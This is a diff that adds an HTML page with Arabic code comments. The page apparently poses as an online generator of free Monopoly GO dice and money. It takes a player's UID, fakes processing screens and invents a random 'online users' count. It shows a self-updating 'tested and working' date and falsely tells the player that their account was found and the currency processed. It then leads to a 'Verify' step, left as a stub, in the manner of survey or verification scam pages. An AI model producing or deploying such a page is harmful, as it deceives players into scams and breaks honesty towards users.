@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MonopolyGO Dice Rolls</title>
+    <style>
+        :root {
+            --main-color: #3bf60d;
+            --dark-bg: #000000;
+            --box-bg: #2a2d3b;
+            --text-light: #a0a0a0;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .logo-container {
+            margin: 1rem 0 0.5rem 0;
+            text-align: center;
+            width: 100%;
+            padding: 0 1rem;
+        }
+        
+        .logo {
+            max-width: 120px;
+            width: 100%;
+            height: auto;
+        }
+        
+        .title {
+            color: var(--main-color);
+            font-size: clamp(1rem, 4vw, 1.5rem);
+            margin: 0.5rem 0;
+            text-align: center;
+            padding: 0 1rem;
+        }
+        
+        .date {
+            color: var(--text-light);
+            font-size: clamp(0.7rem, 3vw, 0.9rem);
+            margin-bottom: 0.5rem;
+            text-align: center;
+            padding: 0 1rem;
+        }
+        
+        .game-image {
+            width: 150px;
+            height: auto;
+            object-fit: contain;
+            margin: 0.5rem 0;
+        }
+        
+        .status-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin: 1rem 0;
+            width: 100%;
+            padding: 0 1rem;
+            max-width: 800px;
+        }
+        
+        .status-box {
+            background-color: var(--box-bg);
+            border: 2px solid var(--main-color);
+            border-radius: 8px;
+            padding: 0.8rem;
+            min-width: 100px;
+            flex: 1;
+            text-align: center;
+            max-width: 150px;
+        }
+        
+        .status-title {
+            color: var(--text-light);
+            font-size: clamp(0.6rem, 3vw, 0.8rem);
+            margin-bottom: 0.3rem;
+        }
+        
+        .status-value {
+            color: var(--main-color);
+            font-size: clamp(0.8rem, 4vw, 1rem);
+            font-weight: bold;
+        }
+        
+        /* تصميم مستطيل الإدخال */
+        .input-container {
+            background-color: var(--box-bg);
+            border: 2px solid var(--main-color);
+            border-radius: 12px;
+            padding: 1.8rem;
+            margin: 1.8rem 0;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 4px 15px rgba(59, 246, 13, 0.2);
+            position: relative;
+            min-height: 300px;
+        }
+        
+        .input-title {
+            color: var(--main-color);
+            font-size: clamp(1rem, 4vw, 1.3rem);
+            margin-bottom: 1.2rem;
+            text-align: center;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            margin-bottom: 1.5rem;
+            background-color: #1a1a1a;
+            border: 2px solid var(--main-color);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .input-field::placeholder {
+            color: #666;
+            opacity: 0.7;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #2fe00a;
+            box-shadow: 0 0 0 3px rgba(59, 246, 13, 0.3);
+        }
+        
+        .next-button {
+            background-color: var(--main-color);
+            color: var(--dark-bg);
+            border: none;
+            border-radius: 8px;
+            padding: 0.7rem 1.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: auto;
+            margin: 0 auto;
+            display: block;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        
+        .next-button:hover {
+            background-color: #2fe00a;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .next-button:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* تأثير الإعدادات */
+        .settings-animation {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--box-bg);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+        
+        .settings-animation.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .settings-icon-animation {
+            font-size: 3rem;
+            color: var(--main-color);
+            margin-bottom: 1rem;
+            animation: spin 1s linear infinite;
+        }
+        
+        .loading-text {
+            color: var(--main-color);
+            font-size: 1.2rem;
+        }
+        
+        /* تصميم المستطيلات الأربعة */
+        .options-container {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .options-row {
+            display: flex;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        
+        .option-box {
+            flex: 1;
+            background-color: var(--box-bg);
+            border: 2px solid var(--main-color);
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            opacity: 0.7;
+            max-width: 150px;
+        }
+        
+        .option-box.selected {
+            border-color: #2fe00a;
+            opacity: 1;
+            transform: scale(1.02);
+            box-shadow: 0 0 10px rgba(59, 246, 13, 0.5);
+        }
+        
+        .option-image {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 0.5rem;
+        }
+        
+        .option-value {
+            color: var(--main-color);
+            font-weight: bold;
+            font-size: 1.1rem;
+            margin-bottom: 0.3rem;
+        }
+        
+        .option-label {
+            color: var(--text-light);
+            font-size: 0.8rem;
+        }
+        
+        .continue-button {
+            background-color: var(--main-color);
+            color: var(--dark-bg);
+            border: none;
+            border-radius: 8px;
+            padding: 0.7rem 1.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: auto;
+            margin: 1rem auto 0;
+            text-transform: uppercase;
+        }
+        
+        .continue-button:hover {
+            background-color: #2fe00a;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .continue-button:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* شاشة التأكيد النهائية */
+        .confirmation-container {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .confirmation-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            flex-wrap: wrap;
+        }
+        
+        .confirmation-label {
+            color: var(--main-color);
+            font-weight: bold;
+            min-width: 120px;
+            text-align: center;
+            margin: 0.5rem;
+        }
+        
+        .confirmation-value {
+            color: white;
+            text-align: center;
+            margin: 0.5rem;
+        }
+        
+        .confirmation-message {
+            color: var(--main-color);
+            text-align: center;
+            margin: 1rem 0;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+        
+        .verification-instruction {
+            color: var(--text-light);
+            text-align: center;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+        }
+        
+        .verify-button {
+            background-color: var(--main-color);
+            color: var(--dark-bg);
+            border: none;
+            border-radius: 8px;
+            padding: 0.7rem 1.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            margin: 0 auto; /* هذا السطر يضمن التوضع في المنتصف */
+            display: block; /* مهم ليعمل margin: auto */
+        }
+        
+        .verify-button:hover {
+            background-color: #2fe00a;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .final-settings {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 1.5rem;
+        }
+        
+        .final-settings-icon {
+            font-size: 2rem;
+            color: var(--main-color);
+            animation: spin 1s linear infinite;
+        }
+        
+        /* شاشة المعالجة النهائية */
+        .final-processing {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--box-bg);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+        
+        .final-settings-large {
+            font-size: 3rem;
+            color: var(--main-color);
+            margin-bottom: 1.5rem;
+            animation: spin 1s linear infinite;
+        }
+        
+        .final-loading-text {
+            color: var(--main-color);
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .final-progress-container {
+            width: 80%;
+            height: 10px;
+            background-color: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+        
+        .final-progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: var(--main-color);
+            border-radius: 10px;
+            animation: progress 1.5s linear forwards;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            width: 100%;
+            padding: 0.5rem;
+        }
+        
+        /* شاشة التحميل الأولية */
+        .loading-settings {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: var(--box-bg);
+            border: 3px solid var(--main-color);
+            border-radius: 20px;
+            padding: clamp(1rem, 5vw, 2rem);
+            box-shadow: 0 0 30px rgba(59, 246, 13, 0.7);
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 250px;
+            animation: fadeOut 0.5s forwards 3.5s;
+        }
+        
+        .settings-icon {
+            width: clamp(50px, 15vw, 80px);
+            height: clamp(50px, 15vw, 80px);
+            margin-bottom: clamp(0.8rem, 3vw, 1.2rem);
+            position: relative;
+        }
+        
+        .gear {
+            position: absolute;
+            font-size: clamp(40px, 12vw, 70px);
+            color: var(--main-color);
+            animation: spin 2s linear infinite;
+        }
+        
+        .gear-small {
+            font-size: clamp(25px, 8vw, 45px);
+            top: 15%;
+            left: -20%;
+            animation: spinReverse 1.5s linear infinite;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background-color: #1a1a1a;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: clamp(0.8rem, 3vw, 1.2rem);
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: var(--main-color);
+            border-radius: 8px;
+            animation: progress 3s linear forwards;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes spinReverse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(-360deg); }
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        @keyframes fadeOut {
+            to { opacity: 0; visibility: hidden; }
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة التحميل الأولية -->
+    <div class="loading-settings" id="loadingSettings">
+        <div class="settings-icon">
+            <div class="gear">⚙️</div>
+            <div class="gear gear-small">⚙️</div>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+    
+    <!-- الهيكل الجديد مع اللوجو في الأعلى -->
+    <div class="logo-container" id="logoContainer" style="display: none;">
+        <img src="images/logo.png" alt="شعار الموقع" class="logo">
+    </div>
+    
+    <!-- المحتوى الرئيسي -->
+    <div class="main-content" id="mainContent" style="display: none;">
+        <!-- الصورة -->
+        <img src="images/MonopolyGO.png" alt="MonopolyGO" class="game-image">
+        
+        <!-- العنوان والتاريخ تحت الصورة مباشرة -->
+        <h1 class="title">Latest updated online tool for Free Dice Rolls</h1>
+        <div class="date" id="currentDate">Tested and working on</div>
+        
+        <!-- مربعات الحالة -->
+        <div class="status-container">
+            <div class="status-box">
+                <div class="status-title">Status:</div>
+                <div class="status-value" id="statusValue">Online</div>
+            </div>
+            <div class="status-box">
+                <div class="status-title">Last Updated:</div>
+                <div class="status-value" id="lastUpdated"></div>
+            </div>
+            <div class="status-box">
+                <div class="status-title">Online Users:</div>
+                <div class="status-value" id="onlineUsers"></div>
+            </div>
+        </div>
+        
+        <!-- مستطيل الإدخال -->
+        <div class="input-container">
+            <div class="input-title">Enter Monopoly Go UID/Username</div>
+            <input type="text" class="input-field" id="uidInput" placeholder="Type your UID or username here...">
+            <button class="next-button" id="nextButton" disabled>Next</button>
+            
+            <!-- تأثير الإعدادات -->
+            <div class="settings-animation" id="settingsAnimation">
+                <div class="settings-icon-animation">⚙️</div>
+                <div class="loading-text">Processing...</div>
+            </div>
+            
+            <!-- المستطيلات الأربعة -->
+            <div class="options-container" id="optionsContainer">
+                <div class="options-row">
+                    <div class="option-box" data-value="99k">
+                        <img src="images/Dice&Money.png" alt="Dice & Money" class="option-image">
+                        <div class="option-value">99k</div>
+                        <div class="option-label">Dice & Money</div>
+                    </div>
+                    <div class="option-box" data-value="199k">
+                        <img src="images/Dice&Money.png" alt="Dice & Money" class="option-image">
+                        <div class="option-value">199k</div>
+                        <div class="option-label">Dice & Money</div>
+                    </div>
+                </div>
+                <div class="options-row">
+                    <div class="option-box" data-value="499k">
+                        <img src="images/Dice&Money.png" alt="Dice & Money" class="option-image">
+                        <div class="option-value">499k</div>
+                        <div class="option-label">Dice & Money</div>
+                    </div>
+                    <div class="option-box" data-value="999k">
+                        <img src="images/Dice&Money.png" alt="Dice & Money" class="option-image">
+                        <div class="option-value">999k</div>
+                        <div class="option-label">Dice & Money</div>
+                    </div>
+                </div>
+                <button class="continue-button" id="continueButton" disabled>Continue</button>
+            </div>
+            
+            <!-- شاشة التأكيد النهائية -->
+            <div class="confirmation-container" id="confirmationContainer">
+                <!-- شاشة المعالجة النهائية -->
+                <div class="final-processing" id="finalProcessing">
+                    <div class="final-settings-large">⚙️</div>
+                    <div class="final-loading-text">Final Processing...</div>
+                    <div class="final-progress-container">
+                        <div class="final-progress-bar"></div>
+                    </div>
+                </div>
+                
+                <!-- محتوى التأكيد (سيظهر بعد انتهاء التحميل) -->
+                <div id="finalConfirmation" style="display: none;">
+                    <div class="confirmation-row">
+                        <div class="confirmation-label">UID/Username:</div>
+                        <div class="confirmation-value" id="uidDisplay"></div>
+                    </div>
+                    <div class="confirmation-row">
+                        <div class="confirmation-label">Dice & Money:</div>
+                        <div class="confirmation-value" id="diceMoneyDisplay"></div>
+                    </div>
+                    
+                    <div class="confirmation-message">
+                        Your account has been found. Dice & Money has been processed.
+                    </div>
+                    
+                    <div class="verification-instruction">
+                        Click on Verify and complete the verification process to send
+                    </div>
+                    
+                    <button class="verify-button" id="verifyButton">Verify</button>
+                    <div class="final-settings">
+                        <div class="final-settings-icon">⚙️</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            // عرض التاريخ الحالي
+            const today = new Date();
+            const options = { year: 'numeric', month: 'long', day: 'numeric' };
+            document.getElementById('currentDate').textContent += ' ' + today.toLocaleDateString('en-US', options);
+            
+            // تحديث تلقائي للتاريخ والمستخدمين النشطين
+            function updateStatus() {
+                const now = new Date();
+                const dateOptions = { year: 'numeric', month: 'short', day: 'numeric' };
+                document.getElementById('lastUpdated').textContent = now.toLocaleDateString('en-US', dateOptions);
+                
+                // رقم عشوائي بين 100 و 999
+                const randomUsers = Math.floor(Math.random() * 900) + 100;
+                document.getElementById('onlineUsers').textContent = randomUsers;
+            }
+            
+            // التحقق من إدخال النص
+            const uidInput = document.getElementById('uidInput');
+            const nextButton = document.getElementById('nextButton');
+            
+            uidInput.addEventListener('input', function() {
+                nextButton.disabled = this.value.trim() === '';
+            });
+            
+            // عند الضغط على زر Next
+            nextButton.addEventListener('click', function() {
+                const settingsAnimation = document.getElementById('settingsAnimation');
+                const inputContainer = document.querySelector('.input-container');
+                const optionsContainer = document.getElementById('optionsContainer');
+                const continueButton = document.getElementById('continueButton');
+                
+                // إظهار تأثير الإعدادات
+                settingsAnimation.classList.add('active');
+                inputContainer.style.borderColor = '#2fe00a';
+                
+                // إخفاء حقول الإدخال
+                document.querySelector('.input-title').style.display = 'none';
+                document.querySelector('.input-field').style.display = 'none';
+                nextButton.style.display = 'none';
+                
+                // بعد انتهاء التأثير
+                setTimeout(function() {
+                    settingsAnimation.classList.remove('active');
+                    inputContainer.style.borderColor = 'var(--main-color)';
+                    
+                    // إظهار المستطيلات الأربعة وزر Continue
+                    optionsContainer.style.display = 'flex';
+                    continueButton.style.display = 'block';
+                }, 2000);
+            });
+            
+            // اختيار أحد المستطيلات
+            const optionBoxes = document.querySelectorAll('.option-box');
+            const continueButton = document.getElementById('continueButton');
+            let selectedOption = null;
+            
+            optionBoxes.forEach(box => {
+                box.addEventListener('click', function() {
+                    // إزالة التحديد من جميع الصناديق
+                    optionBoxes.forEach(b => b.classList.remove('selected'));
+                    
+                    // تحديد الصندوق الحالي
+                    this.classList.add('selected');
+                    selectedOption = this.getAttribute('data-value');
+                    
+                    // تفعيل زر Continue
+                    continueButton.disabled = false;
+                });
+            });
+            
+            // زر Continue
+            continueButton.addEventListener('click', function() {
+                const optionsContainer = document.getElementById('optionsContainer');
+                const confirmationContainer = document.getElementById('confirmationContainer');
+                const finalProcessing = document.getElementById('finalProcessing');
+                const finalConfirmation = document.getElementById('finalConfirmation');
+                
+                // تعبئة البيانات
+                document.getElementById('uidDisplay').textContent = uidInput.value;
+                document.getElementById('diceMoneyDisplay').textContent = selectedOption;
+                
+                // إخفاء خيارات المستطيلات وإظهار شاشة المعالجة
+                optionsContainer.style.display = 'none';
+                this.style.display = 'none';
+                confirmationContainer.style.display = 'flex';
+                finalProcessing.style.display = 'flex';
+                finalConfirmation.style.display = 'none';
+                
+                // بعد انتهاء فترة المعالجة
+                setTimeout(function() {
+                    finalProcessing.style.display = 'none';
+                    finalConfirmation.style.display = 'block';
+                }, 1500);
+            });
+            
+            // زر Verify
+            document.getElementById('verifyButton').addEventListener('click', function() {
+                alert('Verification in progress...');
+                // يمكنك إضافة الوظيفة المطلوبة هنا
+            });
+            
+            // تحديث كل 5 ثواني
+            updateStatus();
+            setInterval(updateStatus, 5000);
+            
+            // إخفاء شاشة التحميل الأولية
+            setTimeout(function() {
+                document.getElementById('loadingSettings').style.display = 'none';
+                document.getElementById('logoContainer').style.display = 'block';
+                document.getElementById('mainContent').style.display = 'flex';
+            }, 3500);
+        };
+    </script>
+</body>
+</html>
